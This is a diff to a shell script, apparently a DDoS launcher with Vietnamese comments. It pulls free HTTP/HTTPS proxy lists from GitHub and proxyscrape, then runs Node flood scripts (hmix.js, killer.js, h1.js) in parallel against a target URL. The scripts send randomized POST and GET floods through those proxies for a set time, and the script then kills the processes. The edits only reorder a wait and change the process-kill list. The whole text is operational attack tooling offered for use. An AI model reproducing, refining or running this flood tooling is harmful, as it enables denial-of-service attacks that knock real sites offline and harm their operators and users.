@@ -12,6 +12,7 @@ for type in http https; do
 curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt" >> live.txt
 curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=${type}" >> live.txt
 done
+wait
 
 # Chạy các script node
 node hmix.js -m POST -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
@@ -19,5 +20,5 @@ node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix 
 node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
 node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
 node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
-wait
-pgrep -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
+
+pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9
